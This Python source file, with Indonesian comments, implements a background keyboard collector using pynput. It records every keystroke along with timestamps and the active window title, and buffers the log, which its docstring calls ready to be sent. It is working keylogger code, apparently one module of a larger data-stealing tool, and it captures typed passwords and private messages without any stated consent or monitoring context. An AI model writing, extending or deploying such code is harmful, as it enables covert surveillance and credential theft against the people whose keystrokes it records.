"""
collectors/keyboard.py
Keyboard listener yang mencatat keystroke beserta window aktif saat tombol ditekan.
"""

import logging
import threading
from datetime import datetime
from typing import Callable, Optional

from pynput import keyboard

from collectors.window import get_active_window

logger = logging.getLogger(__name__)


class KeyboardCollector:
    """
    Mendengarkan input keyboard secara background dan mengumpulkan
    log dalam format teks yang siap dikirim.

    Format log:
        [HH:MM:SS | Window Title] keystrokes...
        [HH:MM:SS | Window Title] keystrokes...
    """

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._buffer: list[str] = []          # baris-baris log
        self._current_window: str = ""        # window aktif terakhir
        self._current_line: str = ""          # teks keystroke saat ini
        self._listener: Optional[keyboard.Listener] = None

    # ── Public API ─────────────────────────────────────────────────────────────

    def start(self) -> None:
        """Mulai keyboard listener di background thread."""
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.daemon = True
        self._listener.start()
        logger.info("KeyboardCollector started.")

    def stop(self) -> None:
        """Hentikan listener."""
        if self._listener:
            self._listener.stop()
        logger.info("KeyboardCollector stopped.")

    def flush(self) -> str:
        """
        Ambil semua log yang terkumpul lalu reset buffer.
        Thread-safe.
        """
        with self._lock:
            # Simpan baris terakhir yang mungkin belum di-commit
            self._commit_current_line()
            if not self._buffer:
                return ""
            log_text = "\n".join(self._buffer)
            self._buffer.clear()
            return log_text

    # ── Internal ───────────────────────────────────────────────────────────────

    def _on_press(self, key) -> None:
        try:
            window = get_active_window()

            # Jika window berubah → commit baris lama, mulai baris baru
            if window != self._current_window:
                with self._lock:
                    self._commit_current_line()
                    self._current_window = window
                    ts = datetime.now().strftime("%H:%M:%S")
                    self._current_line = f"[{ts} | {window or 'Unknown'}] "

            # Rekam tombol
            key_str = self._key_to_str(key)
            with self._lock:
                self._current_line += key_str

        except Exception as exc:
            logger.debug("_on_press error: %s", exc)

    def _commit_current_line(self) -> None:
        """Pindahkan baris saat ini ke buffer. HARUS dipanggil di dalam lock."""
        if self._current_line.strip():
            self._buffer.append(self._current_line)
            self._current_line = ""

    @staticmethod
    def _key_to_str(key) -> str:
        """Ubah objek pynput Key menjadi representasi teks yang mudah dibaca."""
        try:
            # Karakter biasa
            return key.char
        except AttributeError:
            pass

        # Tombol spesial
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BS]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.shift: "",
            keyboard.Key.shift_r: "",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.cmd: "[WIN]",
        }

        if key in special:
            return special[key]

        # Tombol lain (F1-F12, arrow, dll)
        return f"[{str(key).replace('Key.', '').upper()}]"
